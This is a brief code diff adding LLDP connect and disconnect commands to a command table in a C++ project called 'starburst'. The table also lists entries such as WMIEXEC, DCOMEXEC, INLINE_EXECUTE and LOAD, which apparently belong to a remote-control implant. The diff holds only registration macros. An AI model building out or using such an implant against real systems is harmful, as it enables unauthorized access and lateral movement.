@@ -426,6 +426,18 @@ namespace starburst {
   #define CMD_REG_DCOMEXEC
 #endif
 
+#ifdef INCLUDE_CMD_LLDP_CONNECT
+  #define CMD_REG_LLDP_CONNECT { CMD_LLDP_CONNECT, cmd_lldp_connect },
+#else
+  #define CMD_REG_LLDP_CONNECT
+#endif
+
+#ifdef INCLUDE_CMD_LLDP_DISCONNECT
+  #define CMD_REG_LLDP_DISCONNECT { CMD_LLDP_DISCONNECT, cmd_lldp_disconnect },
+#else
+  #define CMD_REG_LLDP_DISCONNECT
+#endif
+
 #define COMMAND_TABLE_ENTRIES \
     CMD_REG_EXIT              \
     CMD_REG_SLEEP             \
@@ -494,7 +506,9 @@ namespace starburst {
     CMD_REG_INLINE_EXECUTE    \
     CMD_REG_LOAD              \
     CMD_REG_WMIEXEC           \
-    CMD_REG_DCOMEXEC
+    CMD_REG_DCOMEXEC          \
+    CMD_REG_LLDP_CONNECT      \
+    CMD_REG_LLDP_DISCONNECT
 
 }
 
